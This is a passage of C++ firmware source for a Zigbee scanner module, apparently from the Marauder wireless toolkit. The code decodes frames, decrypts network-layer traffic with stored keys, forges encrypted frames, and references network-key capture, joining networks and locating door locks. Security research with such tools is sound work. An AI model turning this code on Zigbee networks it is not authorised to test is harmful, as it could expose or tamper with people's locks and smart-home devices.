  for (int i = 0; i < ZB_PING_MAX_PENDING; i++)
    if (this->zb_pending[i].active && this->zb_pending[i].target == target)
      return &this->zb_pending[i];
  return nullptr;
}

ZbPendingPing *ZBScan::zbAllocPending(uint16_t target, uint16_t pan, uint8_t zdoSeq) {
  for (int i = 0; i < ZB_PING_MAX_PENDING; i++) {
    if (!this->zb_pending[i].active) {
      this->zb_pending[i] = { true, target, pan, zdoSeq, (uint32_t)millis() };
      return &this->zb_pending[i];
    }
  }
  ZbPendingPing *oldest = &this->zb_pending[0];
  for (int i = 1; i < ZB_PING_MAX_PENDING; i++)
    if (this->zb_pending[i].sentAt_ms < oldest->sentAt_ms) oldest = &this->zb_pending[i];
  *oldest = { true, target, pan, zdoSeq, (uint32_t)millis() };
  return oldest;
}

ZbNodeDescCache *ZBScan::zbFindCache(uint16_t addr) {
  for (int i = 0; i < ZB_NODE_DESC_CACHE; i++)
    if (this->zb_descCache[i].valid && this->zb_descCache[i].addr == addr)
      return &this->zb_descCache[i];
  return nullptr;
}

ZbNodeDescCache *ZBScan::zbAllocCache(uint16_t addr) {
  for (int i = 0; i < ZB_NODE_DESC_CACHE; i++) {
    if (!this->zb_descCache[i].valid) {
      this->zb_descCache[i].valid = true;
      this->zb_descCache[i].addr  = addr;
      return &this->zb_descCache[i];
    }
  }
  this->zb_descCache[0].valid = true;
  this->zb_descCache[0].addr  = addr;
  return &this->zb_descCache[0];
}

void ZBScan::zbRecordLockInfo(uint16_t addr, uint16_t pan, uint8_t ep, uint16_t profile) {
  for (int i = 0; i < ZB_LOCK_MAX_INFO; i++)
    if (this->zb_locks[i].valid && this->zb_locks[i].addr == addr) {
      this->zb_locks[i] = { true, addr, pan, ep, profile }; return;
    }
  for (int i = 0; i < ZB_LOCK_MAX_INFO; i++)
    if (!this->zb_locks[i].valid) {
      this->zb_locks[i] = { true, addr, pan, ep, profile }; return;
    }
  this->zb_locks[0] = { true, addr, pan, ep, profile };
}

bool ZBScan::zbFindAuxHeader(const uint8_t *nwk, uint8_t len, uint16_t nwkFc,
                             uint8_t &auxOffset) {
  uint8_t off = 8;
  if (off > len) return false;
  if ((nwkFc >> 8) & 0x01) { if (off + 1 > len) return false; off++; }   // multicast
  if ((nwkFc & ZB_NWK_FC_EXT_DST) && off + 8 <= len) off += 8;
  if ((nwkFc & ZB_NWK_FC_EXT_SRC) && off + 8 <= len) off += 8;
  if (nwkFc & ZB_NWK_FC_SOURCE_ROUTE) {
    if (off + 2 > len) return false;
    uint8_t relayCount = nwk[off];
    off += 2 + relayCount * 2;
    if (off > len) return false;
  }
  if (!(nwkFc & ZB_NWK_FC_SECURITY)) return false;
  auxOffset = off;
  return true;
}

bool ZBScan::zbNwkDecrypt(const uint8_t *nwk, uint8_t nwkLen, uint16_t nwkSrc,
                          uint8_t *plainOut, uint8_t &plainLen) {
  if (nwkLen < 10) return false;
  uint16_t nwkFc = (uint16_t)nwk[0] | ((uint16_t)nwk[1] << 8);

  uint8_t auxOffset;
  if (!this->zbFindAuxHeader(nwk, nwkLen, nwkFc, auxOffset)) return false;
  if (auxOffset + 6 > nwkLen) return false;

  uint8_t secCtrl  = nwk[auxOffset];
  uint8_t secLevel = secCtrl & 0x07;
  bool    hasExtSrc = (secCtrl >> 5) & 0x01;

  uint8_t off = auxOffset + 1;
  const uint8_t *frameCounterBytes = &nwk[off];
  off += 4;

  uint64_t srcEui64 = 0;
  if (hasExtSrc) {
    if (off + 8 > nwkLen) return false;
    for (int i = 0; i < 8; i++) srcEui64 |= ((uint64_t)nwk[off + i] << (8 * i));
    off += 8;
  } else {
    int idx = this->zbFindNode(nwkSrc);
    if (idx < 0 || zigbee_nodes->get(idx).ext_addr == 0) return false;
    srcEui64 = zigbee_nodes->get(idx).ext_addr;
  }
  if (off + 1 > nwkLen) return false;
  uint8_t keySeq = nwk[off]; off += 1;

  uint8_t cipherStart = off;
  bool encrypted = (secLevel & 0x04) != 0;
  uint8_t micLen;
  switch (secLevel & 0x03) { case 0: micLen = 0; break; case 1: micLen = 4; break;
                             case 2: micLen = 8; break; default: micLen = 16; }
  if (cipherStart + micLen > nwkLen) return false;
  uint8_t cipherLen = nwkLen - cipherStart - micLen;
  if (cipherLen == 0 || cipherLen > 96) return false;

  ZbKey *key = this->zbFindNetworkKey(keySeq);
  if (!key) return false;

  if (!encrypted) { memcpy(plainOut, &nwk[cipherStart], cipherLen); plainLen = cipherLen; return true; }

  uint8_t nonce[13];
  for (int i = 0; i < 8; i++) nonce[i] = (uint8_t)(srcEui64 >> (8 * i));
  memcpy(nonce + 8, frameCounterBytes, 4);
  nonce[12] = secCtrl;

  mbedtls_ccm_context ctx;
  mbedtls_ccm_init(&ctx);
  int ret = mbedtls_ccm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key->key, 128);
  if (ret == 0)
    ret = mbedtls_ccm_star_auth_decrypt(&ctx, cipherLen, nonce, sizeof(nonce),
                                        nwk, cipherStart, &nwk[cipherStart], plainOut,
                                        &nwk[cipherStart + cipherLen], micLen);
  mbedtls_ccm_free(&ctx);
  if (ret != 0) return false;
  plainLen = cipherLen;
  return true;
}

bool ZBScan::zbNwkEncryptAndSend(uint16_t dstPan, uint16_t dstShort,
                                 const uint8_t *apsFrame, uint8_t apsLen) {
  ZbKey *key = this->zbFindLatestNetworkKey();
  if (!key || apsLen > 32) return false;

  uint16_t ownShort = this->zb_joinAssignedShort;
  uint64_t ownEui64 = this->zb_ownEUI64;

  // NWK header: Data, protoVer 2, discoverRoute, security.
  uint16_t nwkFc = 0x0048 | ZB_NWK_FC_SECURITY;
  uint8_t nwk[8];
  nwk[0] = (uint8_t)(nwkFc & 0xFF); nwk[1] = (uint8_t)(nwkFc >> 8);
  nwk[2] = (uint8_t)(dstShort & 0xFF); nwk[3] = (uint8_t)(dstShort >> 8);
  nwk[4] = (uint8_t)(ownShort & 0xFF); nwk[5] = (uint8_t)(ownShort >> 8);
  nwk[6] = 30; nwk[7] = this->zb_pingNwkSeq++;

  // AUX: secCtrl(1) frameCounter(4,LE) extSrc(8,LE) keySeq(1); secLevel 5
  // (ENC-MIC32), key id 1 (Network), ext nonce.
  uint8_t aux[14];
  aux[0] = 5 | (0x01 << 3) | (0x01 << 5);
  this->zb_nwkFrameCounter++;
  aux[1] = (uint8_t)(this->zb_nwkFrameCounter & 0xFF);
  aux[2] = (uint8_t)(this->zb_nwkFrameCounter >> 8);
  aux[3] = (uint8_t)(this->zb_nwkFrameCounter >> 16);
  aux[4] = (uint8_t)(this->zb_nwkFrameCounter >> 24);
  for (int i = 0; i < 8; i++) aux[5 + i] = (uint8_t)(ownEui64 >> (8 * i));
  aux[13] = key->seqNum;

  uint8_t aad[8 + 14];
  memcpy(aad, nwk, 8); memcpy(aad + 8, aux, 14);

  uint8_t nonce[13];
  for (int i = 0; i < 8; i++) nonce[i] = (uint8_t)(ownEui64 >> (8 * i));
  memcpy(nonce + 8, &aux[1], 4); nonce[12] = aux[0];

  uint8_t ciphertext[32];
  uint8_t tag[4];
  mbedtls_ccm_context ctx;
  mbedtls_ccm_init(&ctx);
  int ret = mbedtls_ccm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key->key, 128);
  if (ret == 0)
    ret = mbedtls_ccm_star_encrypt_and_tag(&ctx, apsLen, nonce, sizeof(nonce),
                                           aad, sizeof(aad), apsFrame, ciphertext,
                                           tag, sizeof(tag));
  mbedtls_ccm_free(&ctx);
  if (ret != 0) { Serial.println(F("[ZBPING] NWK encrypt failed")); return false; }

  uint8_t frame[ZIGBEE_MAX_FRAME_LEN];
  uint8_t off = 0;
  frame[off++] = 0x61;          // MAC: Data, ACK req, PAN ID compression
  frame[off++] = 0x88;          // dst=short, src=short
  frame[off++] = this->zb_pingMacSeq++;
  frame[off++] = (uint8_t)(dstPan & 0xFF);  frame[off++] = (uint8_t)(dstPan >> 8);
  frame[off++] = (uint8_t)(dstShort & 0xFF); frame[off++] = (uint8_t)(dstShort >> 8);
  frame[off++] = (uint8_t)(ownShort & 0xFF); frame[off++] = (uint8_t)(ownShort >> 8);
  memcpy(&frame[off], nwk, 8);             off += 8;
  memcpy(&frame[off], aux, 14);            off += 14;
  memcpy(&frame[off], ciphertext, apsLen); off += apsLen;
  memcpy(&frame[off], tag, 4);             off += 4;
  return this->zbSendRawFrame(frame, off);
}

void ZBScan::zbReportNodeDesc(uint16_t addr, const uint8_t *d, uint32_t rtt_ms) {
  uint8_t  logicalType      = d[0] & 0x07;
  uint8_t  macCapability    = d[2];
  uint16_t manufacturerCode = (uint16_t)d[3] | ((uint16_t)d[4] << 8);
  uint8_t  maxBufferSize    = d[5];
  uint16_t maxInTransferSize  = (uint16_t)d[6]  | ((uint16_t)d[7]  << 8);
  uint16_t serverMask         = (uint16_t)d[8]  | ((uint16_t)d[9]  << 8);
  uint16_t maxOutTransferSize = (uint16_t)d[10] | ((uint16_t)d[11] << 8);
  uint8_t  descCapability     = d[12];

  Serial.printf("[ZBPING] 0x%04X responded in %lums - %s, MACcap=0x%02X, mfg=0x%04X\n",
                addr, (unsigned long)rtt_ms, zbLogicalTypeName(logicalType),
                macCapability, manufacturerCode);

  ZbNodeDescCache *c = this->zbFindCache(addr);
  if (!c) { c = this->zbAllocCache(addr); Serial.println(F("[ZBPING]   (new descriptor)")); }
  else if (c->logicalType != logicalType || c->macCapability != macCapability ||
           c->manufacturerCode != manufacturerCode || c->serverMask != serverMask)
    Serial.println(F("[ZBPING]   (descriptor changed since last sighting)"));

  c->valid = true; c->addr = addr; c->logicalType = logicalType;
  c->macCapability = macCapability; c->manufacturerCode = manufacturerCode;
  c->maxBufferSize = maxBufferSize; c->maxInTransferSize = maxInTransferSize;
  c->serverMask = serverMask; c->maxOutTransferSize = maxOutTransferSize;
  c->descCapability = descCapability;
}

const char *ZBScan::zbLogicalTypeName(uint8_t t) {
  switch (t) { case 0: return "Coordinator"; case 1: return "Router";
               case 2: return "End Device"; default: return "Reserved"; }
}

// MAC-header decoder. Ported from IEEE802154Sniffer::_decodeMac(), reduced to
// the addressing/beacon fields Marauder records.
bool ZBScan::zbDecodeMac(const ZbSnifferFrame &raw, ZbFrameInfo &info) {
  const uint8_t *p   = raw.data;
  const uint8_t  len = raw.len;
  if (len < 3)
    return false;

  info.rssi    = raw.rssi;
  info.lqi     = raw.lqi;
  info.channel = raw.channel;
  info.isZigbee = false;
  info.hasNwk   = false;
  info.beaconSeen = false;
  info.beaconAssocPermit = false;
  info.beaconRouterCapacity = false;
  info.beaconEndDevCapacity = false;
  info.macCmd   = 0;
  info.zbNwkCmd = 0;
  info.zbNwkType = 0;
  info.zbNwkSecurity = false;
  info.srcExtended = 0;
  info.dstExtended = 0;
  info.nwkSrc = 0xFFFF;
  info.nwkDst = 0xFFFF;

  uint16_t fc      = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
  info.frameType   = fc & ZB_FC_FRAME_TYPE_MASK;
  info.srcAddrMode = (fc >> 14) & 0x03;
  info.dstAddrMode = (fc >> 10) & 0x03;
  bool panComp     = (fc >> 6) & 0x01;
  info.seqNum      = p[2];
  info.panId       = 0xFFFF;
  info.macSrc      = 0xFFFF;
  info.macDst      = 0xFFFF;
  info.macSecurityEnabled = (fc >> 3) & 0x01;
  info.macFramePending    = (fc >> 4) & 0x01;
  info.macAckRequest      = (fc >> 5) & 0x01;

  uint8_t off = 3;

  // Destination PAN + address
  if (info.dstAddrMode == ZB_ADDR_MODE_SHORT && off + 4 <= len) {
    info.panId  = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
    info.macDst = (uint16_t)p[off+2] | ((uint16_t)p[off+3] << 8);
    off += 4;
  } else if (info.dstAddrMode == ZB_ADDR_MODE_EXTENDED && off + 10 <= len) {
    info.panId = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
    off += 2;
    info.dstExtended = 0;
    for (int i = 0; i < 8; i++)
      info.dstExtended |= ((uint64_t)p[off+i] << (8*i));
    info.macDst = 0xFFFE;
    off += 8;
  }

  // Source address
  if (info.srcAddrMode == ZB_ADDR_MODE_SHORT) {
    if (!panComp && off + 2 <= len)
      off += 2;                          // skip src PAN
    if (off + 2 <= len) {
      info.macSrc = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
      off += 2;
    }
  } else if (info.srcAddrMode == ZB_ADDR_MODE_EXTENDED) {
    if (!panComp && off + 2 <= len)
      off += 2;
    if (off + 8 <= len) {
      info.srcExtended = 0;
      for (int i = 0; i < 8; i++)
        info.srcExtended |= ((uint64_t)p[off+i] << (8*i));
      info.macSrc = 0xFFFE;
      off += 8;
    }
  }

  // Start of the MAC payload (NWK layer for data frames, command id for MAC
  // commands). The key-capture path walks the NWK/APS headers from here.
  info.macPayloadOffset = off;

  // Payload decode
  if (off < len && info.frameType == ZB_FC_FRAME_TYPE_DATA) {
    const uint8_t *payload = &p[off];
    uint8_t payLen = len - off;
    if (payLen >= 8) {
      uint8_t nwkType = payload[0] & 0x03;
      if (nwkType == ZB_NWK_TYPE_DATA || nwkType == ZB_NWK_TYPE_CMD) {
        info.isZigbee = true;
        this->zbDecodeNwk(payload, payLen, info);
      }
    }
  } else if (info.frameType == ZB_FC_FRAME_TYPE_BEACON && off + 4 <= len) {
    uint16_t superframe = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
    info.beaconAssocPermit = (superframe >> 15) & 0x01;
    info.beaconSeen = true;
    off += 2;
    off += 2;                            // GTS spec + pending address spec
    // Zigbee beacon payload: protocol ID 0x00, then stack profile / caps
    if (off + 3 <= len && p[off] == 0x00) {
      off++;
      off++;                             // stack profile / protocol version
      uint8_t cap = p[off++];
      info.beaconRouterCapacity = (cap >> 2) & 0x01;
      info.beaconEndDevCapacity = (cap >> 7) & 0x01;
    }
  } else if (info.frameType == ZB_FC_FRAME_TYPE_MACCMD && off < len) {
    // First MAC payload byte is the command identifier.
    info.macCmd = p[off];
  }

  return true;
}

// Zigbee NWK decoder. Ported from IEEE802154Sniffer::_decodeZigbeeNwk(),
// reduced to the source/destination network addresses Marauder tracks.
bool ZBScan::zbDecodeNwk(const uint8_t *p, uint8_t len, ZbFrameInfo &info) {
  if (len < 8)
    return false;

  uint16_t nwkFc = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
  info.zbNwkType = nwkFc & 0x03;
  info.nwkDst    = (uint16_t)p[2] | ((uint16_t)p[3] << 8);
  info.nwkSrc    = (uint16_t)p[4] | ((uint16_t)p[5] << 8);
  info.zbNwkSecurity = (nwkFc & ZB_NWK_FC_SECURITY) != 0;
  info.hasNwk    = true;

  bool multicast = (nwkFc >> 8) & 0x01;
  uint8_t off = 8;
  if (multicast && off + 1 <= len)
    off++;                               // multicast control byte

  if ((nwkFc & ZB_NWK_FC_EXT_DST) && off + 8 <= len) {
    uint64_t extDst = 0;
    memcpy(&extDst, &p[off], 8);
    if (info.dstExtended == 0)
      info.dstExtended = extDst;
    off += 8;
  }
  if ((nwkFc & ZB_NWK_FC_EXT_SRC) && off + 8 <= len) {
    uint64_t extSrc = 0;
    memcpy(&extSrc, &p[off], 8);
    if (info.srcExtended == 0)
      info.srcExtended = extSrc;
    off += 8;
  }

  // Source-route subframe (relay list) sits before the NWK command id.
  if ((nwkFc & ZB_NWK_FC_SOURCE_ROUTE) && off + 2 <= len) {
    uint8_t relayCount = p[off];
    off += 2;                            // relay count + relay index
    off += (uint8_t)(relayCount * 2);    // relay addresses
  }

  // For an unsecured NWK command frame the command id is the next byte.
  // (Secured frames have an aux header + encrypted payload we don't decrypt.)
  if (info.zbNwkType == ZB_NWK_TYPE_CMD && !info.zbNwkSecurity && off < len)
    info.zbNwkCmd = p[off];

  return true;
}

// ---------------------------------------------------------------------------
// Scan entry points, driven by WiFiScan's StartScan / StopScan / main.
// ---------------------------------------------------------------------------
void ZBScan::RunZigbeeScan(uint8_t scan_mode, uint16_t color) {
  (void)scan_mode;
  (void)color;

  // Fresh node list for this run, same as RunAPScan recreates access_points.
  this->clearZigbeeNodes();

  // Preload the known TCLKs (kept across runs so captured network keys and any
  // SD-loaded keys survive) and reset the per-join / coordinator state.
  this->zbLoadDefaultKeys();
  memset(this->zb_joins, 0, sizeof(this->zb_joins));
  this->zb_coordEUI64 = 0;

  // Reset ZDO ping / find_lock state for this run.
  memset(this->zb_pending, 0, sizeof(this->zb_pending));
  memset(this->zb_descCache, 0, sizeof(this->zb_descCache));
  memset(this->zb_locks, 0, sizeof(this->zb_locks));
  this->zb_lockPhase = ZB_LOCK_IDLE;
  this->zb_lockSweeping = false;

  this->zb_frame_count  = 0;
  this->zb_zigbee_count = 0;

  // A specific start channel (11..26) locks the radio there; 0 hops the band.
  if (this->zb_start_channel >= ZIGBEE_MIN_CHANNEL &&
      this->zb_start_channel <= ZIGBEE_MAX_CHANNEL) {
    this->zb_channel     = this->zb_start_channel;
    this->zb_channel_hop = false;
  } else {
    this->zb_channel     = ZIGBEE_MIN_CHANNEL;
    this->zb_channel_hop = true;
  }

  if (!this->zbRadioInit(this->zb_channel) || !this->zbRadioStart()) {
    Serial.println(F("[ZBScan] Failed to start 802.15.4 radio"));
    return;
  }

  this->zb_last_hop       = millis();
  this->zb_last_ui_update = millis();
  if (this->zb_channel_hop)
    Serial.println(F("[ZBScan] Zigbee sniffing started (hopping ch 11-26)"));
  else
    Serial.printf("[ZBScan] Zigbee sniffing started (locked ch %u)\n", this->zb_channel);
}

void ZBScan::StopZigbeeScan() {
  this->zbRadioStop();
  Serial.println(F("[ZBScan] Zigbee sniffing stopped"));
}

void ZBScan::zigbeeLoop(uint32_t currentTime) {
  if (!this->zb_running)
    return;

  // Drain the RX queue, log EVERY frame, and fold it into the node list.
  ZbSnifferFrame raw;
  while (xQueueReceive(zb_rx_queue, &raw, 0) == pdTRUE) {
    this->zb_frame_count++;

    ZbFrameInfo info = {};
    if (this->zbDecodeMac(raw, info)) {
      if (info.isZigbee)
        this->zb_zigbee_count++;

      // Per-frame visibility: beacons, MAC commands, data, broadcasts, ACKs.
      if (this->zb_verbose &&
          (this->zb_show_bcast || !zb_is_bcast(info.macDst)))
        this->zbPrintFrame(info);

      this->zbProcessFrame(info);

      // Network-key capture: watch assoc responses + APS Transport Key frames.
      this->zbKeyCaptureFrame(info, raw.data, raw.len, info.macPayloadOffset);

      // Active join (if in progress): watch for our Association Response.
      this->zbJoinProcessFrame(info, raw.data, raw.len, info.macPayloadOffset);

      // ZDO ping / find_lock: watch for NWK-encrypted responses to us.
      this->zbPingProcessFrame(info, raw.data, raw.len, info.macPayloadOffset);
    }
  }

  // Drive an in-progress join (poll / timeout), ZDO ping/lock timeouts, and
  // drop stale pending joins.
  this->zbJoinUpdate();
  this->zbPingUpdate();
  this->zbExpireJoins();

  // When hopping, move one channel each HOP_DELAY*2; locked mode never hops.
  if (this->zb_channel_hop && currentTime - this->zb_last_hop >= (HOP_DELAY * 2)) {
    this->zb_last_hop = millis();
    this->zbChannelHop();
    // Keep the on-screen "CH n" label in step with the radio as it hops.
    this->zbDrawStatusLabel();
  }
}

#endif // HAS_ZIGBEE

